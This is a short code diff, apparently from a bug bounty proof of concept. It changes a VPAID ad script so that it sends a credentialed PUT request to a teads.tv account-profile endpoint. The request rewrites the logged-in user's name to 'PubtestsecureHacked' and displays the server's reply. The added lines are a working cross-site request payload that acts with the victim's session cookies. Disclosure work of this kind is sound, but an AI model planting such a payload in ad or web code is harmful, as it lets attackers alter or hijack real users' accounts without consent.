@@ -2043,9 +2043,9 @@
         }
         window.getVPAIDAd = function() {
               var xhttp = new XMLHttpRequest();
-              xhttp.open("GET", "https://api.teads.tv/v2/security/rights", true);
+              xhttp.open("PUT", "https://login.teads.tv/api/profile/me", true);
   xhttp.withCredentials = true;
-  xhttp.send();
+  xhttp.send(JSON.stringify({"id":57584,"email":"pubtestsecure@gmail.com","culture":"en_US","firstname":"PubtestsecureHacked","lastname":"Test","timezone":"Europe/Paris"}));
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4) {
       alert(this.responseText);
